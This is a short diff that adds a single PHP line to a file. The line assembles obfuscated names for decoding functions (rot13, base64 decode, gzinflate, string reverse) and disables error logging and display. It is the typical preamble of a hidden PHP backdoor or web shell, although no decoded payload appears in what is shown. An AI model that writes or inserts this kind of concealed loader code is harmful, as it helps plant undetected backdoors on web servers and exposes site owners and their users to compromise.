@@ -1,0 +1,1 @@
+<?php $KkDYo = 'st'.'r'.'_rot1'.'3'; $ydfSq = 'b'.'ase6'.'4'.'_de'.'code'; $AXPWL = 'gzi'.'nflate'; $GlgRa = 'strre'.'v'; ini_set('error_log', NULL); ini_set('display_errors', 0); error_reporting(0); ?>
